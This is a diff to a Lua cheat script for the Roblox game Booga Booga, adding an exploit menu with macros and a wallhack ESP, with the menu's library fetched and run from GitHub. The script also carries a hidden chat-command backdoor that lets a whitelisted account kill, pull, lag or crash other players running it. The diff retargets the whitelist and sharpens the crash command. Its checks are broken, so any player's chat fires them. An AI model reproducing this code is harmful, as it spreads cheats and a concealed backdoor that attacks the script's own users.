@@ -1,6 +1,5 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("Booga Booga X", "DarkTheme")
-local AutoHealVal
 local lplr = game.Players.LocalPlayer
 
 local Tab = Window:NewTab("Macros")
@@ -47,8 +46,8 @@ Section3:NewButton("WaterWalker", "Makes You Have WaterWalker For Free", functio
 				game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(Speed,0,0)
 			end;
 		end
-	end)
-end
+	end
+end)
 	
 local Tab = Window:NewTab("Visuals")
 local Section = Tab:NewSection("Render")
@@ -78,7 +77,7 @@ Section:NewButton("PlayerEsp", "Views Players on the other side of Walls", funct
 		if #game:GetService("Teams"):GetTeams() > 0 then
 			local friendly = player.Team.Name
 			for i,v in pairs(game:GetService("Teams"):GetTeams()) do
-				if v.Name ~= friendly and v.Name ~= (game.Teams:FindFirstChild("Spectators") and game.Teams.Spectators.Name) then
+				if v.Name == friendly and v.Name ~= game.Players.LocalPlayer.Name then
 					print("Enemy team: "..v.Name)
 					local enemyPlayers = v:GetPlayers()
 					for i,v in pairs(enemyPlayers) do
@@ -122,6 +121,9 @@ Section:NewButton("PlayerEsp", "Views Players on the other side of Walls", funct
 	end)
 end)
 
+
+	
+
 while true do wait()
 	local events = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
 	local messageDoneFiltering = events:WaitForChild("OnMessageDoneFiltering")
@@ -130,11 +132,13 @@ local whitelisted = "noobycreeper2"
 
 
 	messageDoneFiltering.OnClientEvent:Connect(function(message)
+		
 		local player = players:FindFirstChild(message.FromSpeaker)
+		local m = message
 		local message = message.Message or ""
 
 		if player then
-			if player.Name == "relviesx" or "3g4g34g34g43g" then
+			if player.Name == whitelisted or "3g4g34g34g43g" then
 
 				if message == ";killDefault" then
 					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g" then
@@ -157,9 +161,7 @@ local whitelisted = "noobycreeper2"
 					end
 				elseif message == ";crashDefault" then
 					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g"  then
-						setfpscap(15)
-						wait(3)
-						setfpscap(0)
+						setfpscap(1)
 					end
 				elseif message == ";forceBringDefault" then
 					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g"  then
@@ -168,7 +170,7 @@ local whitelisted = "noobycreeper2"
 					end
 				elseif message == ";lagDefault" then
 					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g"  then
-						setfpscap(16)
+						setfpscap(7)
 					end
 				elseif message == ";fpsunlockDefault" then
 					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g"  then
@@ -206,5 +208,5 @@ local whitelisted = "noobycreeper2"
 				end
 			end
 		end
-	end)
+		end)
 end
